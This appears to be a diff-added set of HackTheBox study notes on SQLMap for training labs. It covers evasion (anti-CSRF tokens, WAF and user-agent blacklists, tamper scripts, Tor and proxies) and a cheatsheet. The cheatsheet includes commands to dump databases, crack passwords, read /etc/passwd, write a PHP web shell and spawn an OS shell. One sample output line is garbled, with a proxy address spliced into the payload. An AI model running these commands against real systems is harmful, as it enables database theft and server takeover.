+In most basic terms, each HTTP request in such a scenario should have a (valid) token value available only if the user actually visited and used the page. While the original idea was the prevention of scenarios with malicious links, where just opening these links would have undesired consequences for unaware logged-in users (e.g., open administrator pages and add a new user with predefined credentials), this security feature also inadvertently hardened the applications against the (unwanted) automation.
+
+Nevertheless, SQLMap has options that can help in bypassing anti-CSRF protection. Namely, the most important option is `--csrf-token`. By specifying the token parameter name (which should already be available within the provided request data), SQLMap will automatically attempt to parse the target response content and search for fresh token values so it can use them in the next request.
+
+Additionally, even in a case where the user does not explicitly specify the token's name via `--csrf-token`, if one of the provided parameters contains any of the common infixes (i.e. `csrf`, `xsrf`, `token`), the user will be prompted whether to update it in further requests:
+
+```shell
+gitblanc@htb[/htb]$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
+
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.4.9}
+|_ -| . [']     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[*] starting @ 22:18:01 /2020-09-18/
+
+POST parameter 'csrf-token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y
+```
+
+## Unique Value Bypass
+
+In some cases, the web application may only require unique values to be provided inside predefined parameters. Such a mechanism is similar to the anti-CSRF technique described above, except that there is no need to parse the web page content. So, by simply ensuring that each request has a unique value for a predefined parameter, the web application can easily prevent CSRF attempts while at the same time averting some of the automation tools. For this, the option `--randomize` should be used, pointing to the parameter name containing a value which should be randomized before being sent:
+
+```shell
+gitblanc@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
+
+URI: http://www.example.com:80/?id=1&rp=99954
+URI: http://www.example.com:80/?id=1&rp=87216
+URI: http://www.example.com:80/?id=9030&rp=36456
+URI: http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&rp=16689
+URI: http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&rp=40049
+URI: http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&rp=95185
+```
+
+## Calculated Parameter Bypass
+
+Another similar mechanism is where a web application expects a proper parameter value to be calculated based on some other parameter value(s). Most often, one parameter value has to contain the message digest (e.g. `h=MD5(id)`) of another one. To bypass this, the option `--eval` should be used, where a valid Python code is being evaluated just before the request is being sent to the target:
+
+```shell
+gitblanc@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
+
+URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
+URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
+URI: http://www.example.com:80/?id=9061&h=4d7e0d72898ae7ea3593eb5ebf20c744
+URI: http://www.example.com:80/?id=1%2C.%2C%27%22.%2C%28.%29&h=620460a56536e2d32fb2f4842ad5a08d
+URI: http://www.example.com:80/?id=1%27MyipGP%3C%27%22%3EibjjSu&h=db7c815825b14d67aaa32da09b8b2d42
+URI: http://www.example.com:80/?id=1%29%20AND%209978%socks4://177.39.187.70:33283ssocks4://177.39.187.70:332833D1232%20AND%20%284955%3D4955&h=02312acd4ebe69e2528382dfff7fc5cc
+```
+
+## IP Address Concealing
+
+In case we want to conceal our IP address, or if a certain web application has a protection mechanism that blacklists our current IP address, we can try to use a proxy or the anonymity network Tor. A proxy can be set with the option `--proxy` (e.g. `--proxy="socks4://177.39.187.70:33283"`), where we should add a working proxy.
+
+In addition to that, if we have a list of proxies, we can provide them to SQLMap with the option `--proxy-file`. This way, SQLMap will go sequentially through the list, and in case of any problems (e.g., blacklisting of IP address), it will just skip from current to the next from the list. The other option is Tor network use to provide an easy to use anonymization, where our IP can appear anywhere from a large list of Tor exit nodes. When properly installed on the local machine, there should be a `SOCKS4` proxy service at the local port 9050 or 9150. By using switch `--tor`, SQLMap will automatically try to find the local port and use it appropriately.
+
+If we wanted to be sure that Tor is properly being used, to prevent unwanted behavior, we could use the switch `--check-tor`. In such cases, SQLMap will connect to the `https://check.torproject.org/` and check the response for the intended result (i.e., `Congratulations` appears inside).
+
+## WAF Bypass
+
+Whenever we run SQLMap, As part of the initial tests, SQLMap sends a predefined malicious looking payload using a non-existent parameter name (e.g. `?pfov=...`) to test for the existence of a WAF (Web Application Firewall). There will be a substantial change in the response compared to the original in case of any protection between the user and the target. For example, if one of the most popular WAF solutions (ModSecurity) is implemented, there should be a `406 - Not Acceptable` response after such a request.
+
+In case of a positive detection, to identify the actual protection mechanism, SQLMap uses a third-party library [identYwaf](https://github.com/stamparm/identYwaf), containing the signatures of 80 different WAF solutions. If we wanted to skip this heuristical test altogether (i.e., to produce less noise), we can use switch `--skip-waf`.
+
+## User-agent Blacklisting Bypass
+
+In case of immediate problems (e.g., HTTP error code 5XX from the start) while running SQLMap, one of the first things we should think of is the potential blacklisting of the default user-agent used by SQLMap (e.g. `User-agent: sqlmap/1.4.9 (http://sqlmap.org)`).
+
+This is trivial to bypass with the switch `--random-agent`, which changes the default user-agent with a randomly chosen value from a large pool of values used by browsers.
+
+>[!Note]
+>If some form of protection is detected during the run, we can expect problems with the target, even other security mechanisms. The main reason is the continuous development and new improvements in such protections, leaving smaller and smaller maneuver space for attackers.
+
+## Tamper Scripts
+
+Finally, one of the most popular mechanisms implemented in SQLMap for bypassing WAF/IPS solutions is the so-called "tamper" scripts. Tamper scripts are a special kind of (Python) scripts written for modifying requests just before being sent to the target, in most cases to bypass some protection.
+
+For example, one of the most popular tamper scripts [between](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/between.py) is replacing all occurrences of greater than operator (`>`) with `NOT BETWEEN 0 AND #`, and the equals operator (`=`) with `BETWEEN # AND #`. This way, many primitive protection mechanisms (focused mostly on preventing XSS attacks) are easily bypassed, at least for SQLi purposes.
+
+Tamper scripts can be chained, one after another, within the `--tamper` option (e.g. `--tamper=between,randomcase`), where they are run based on their predefined priority. A priority is predefined to prevent any unwanted behavior, as some scripts modify payloads by modifying their SQL syntax (e.g. [ifnull2ifisnull](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/ifnull2ifisnull.py)). In contrast, some tamper scripts do not care about the inner content (e.g. [appendnullbyte](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/appendnullbyte.py)).
+
+Tamper scripts can modify any part of the request, although the majority change the payload content. The most notable tamper scripts are the following:
+
+|**Tamper-Script**|**Description**|
+|---|---|
+|`0eunion`|Replaces instances of UNION with e0UNION|
+|`base64encode`|Base64-encodes all characters in a given payload|
+|`between`|Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`|
+|`commalesslimit`|Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart|
+|`equaltolike`|Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart|
+|`halfversionedmorekeywords`|Adds (MySQL) versioned comment before each keyword|
+|`modsecurityversioned`|Embraces complete query with (MySQL) versioned comment|
+|`modsecurityzeroversioned`|Embraces complete query with (MySQL) zero-versioned comment|
+|`percentage`|Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)|
+|`plus2concat`|Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart|
+|`randomcase`|Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)|
+|`space2comment`|Replaces space character ( ) with comments `/|
+|`space2dash`|Replaces space character ( ) with a dash comment (`--`) followed by a random string and a new line (`\n`)|
+|`space2hash`|Replaces (MySQL) instances of space character ( ) with a pound character (`#`) followed by a random string and a new line (`\n`)|
+|`space2mssqlblank`|Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters|
+|`space2plus`|Replaces space character ( ) with plus (`+`)|
+|`space2randomblank`|Replaces space character ( ) with a random blank character from a valid set of alternate characters|
+|`symboliclogical`|Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|`)|
+|`versionedkeywords`|Encloses each non-function keyword with (MySQL) versioned comment|
+|`versionedmorekeywords`|Encloses each keyword with (MySQL) versioned comment|
+
+To get a whole list of implemented tamper scripts, along with the description as above, switch `--list-tampers` can be used. We can also develop custom Tamper scripts for any custom type of attack, like a second-order SQLi.
+
+## Miscellaneous Bypasses
+
+Out of other protection bypass mechanisms, there are also two more that should be mentioned. The first one is the `Chunked` transfer encoding, turned on using the switch `--chunked`, which splits the POST request's body into so-called "chunks." Blacklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed.
+
+The other bypass mechanisms is the `HTTP parameter pollution` (`HPP`), where payloads are split in a similar way as in case of `--chunked` between different same parameter named values (e.g. `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...`), which are concatenated by the target platform if supporting it (e.g. `ASP`).
+
+# HTB SQLMap Cheatsheet
+
+- View the advanced help menu
+
+```shell
+sqlmap -hh
+```
+
+- Run SQLMap without asking for user input
+
+```shell
+sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
+```
+
+- SQLMap with POST request
+
+```shell
+sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
+```
+
+```shell
+sqlmap -r req10.txt --data="id=1" --dump -D testdb -T flag10
+```
+
+- POST request specifying an injection point with an asterisk
+
+```shell
+sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
+```
+
+- Passing an HTTP request file to SQLMap
+
+```shell
+sqlmap -r req.txt
+```
+
+- Specifying a cookie header
+
+```shell
+sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
+```
+
+- Specifying a PUT request
+
+```shell
+sqlmap -u www.target.com --data='id=1' --method PUT
+```
+
+- Store traffic to an output file
+
+```shell
+sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
+```
+
+- Specify verbosity level
+
+```shell
+sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
+```
+
+- Specifying a prefix or suffix
+
+```shell
+sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
+```
+
+- Specifying the level and risk
+
+```shell
+sqlmap -u www.example.com/?id=1 -v 3 --level=5
+```
+
+- Basic DB enumeration
+
+```shell
+sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
+```
+
+- Table enumeration
+
+```shell
+sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
+```
+
+- Table/row enumeration
+
+```shell
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
+```
+
+- Conditional enumeration
+
+```shell
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
+```
+
+- Database schema enumeration
+
+```shell
+sqlmap -u "http://www.example.com/?id=1" --schema
+```
+
+- Searching for data
+
+```shell
+sqlmap -u "http://www.example.com/?id=1" --search -T user
+```
+
+- Password enumeration and cracking
+
+```shell
+sqlmap -u "http://www.example.com/?id=1" --passwords --batch
+```
+
+- Anti-CSRF token bypass
+
+```shell
+sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
+```
+
+```shell
+sqlmap -r req8.txt --data="id=1&t0ken=sY76sWwb2qidLK984dHuhypY9sOo1dwK3askXYIntU" --csrf-token="t0ken" --dump -D testdb -T flag8
+```
+
+- Bypass unique id (uids)
+
+```shell
+sqlmap -u "http://94.237.48.144:43600/case9.php?id=1&uid=1760525854" --randomize=uid --dump -D testdb -T flag9
+```
+
+- List all tamper scripts
+
+```shell
+sqlmap --list-tampers
+```
+
+- Use a tamper script
+
+```shell
+sqlmap -u "http://94.237.48.144:43600/case11.php?id=1" --tamper=greatest.py --dump -D testdb -T flag11
+```
+
+- Check for DBA privileges
+
+```shell
+sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
+```
+
+- Reading a local file
+
+```shell
+sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
+```
+
+- Writing a file
+
+```shell
+sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+```
+
+- Spawning an OS shell
+
+```shell
+sqlmap -u "http://www.example.com/?id=1" --os-shell
+```
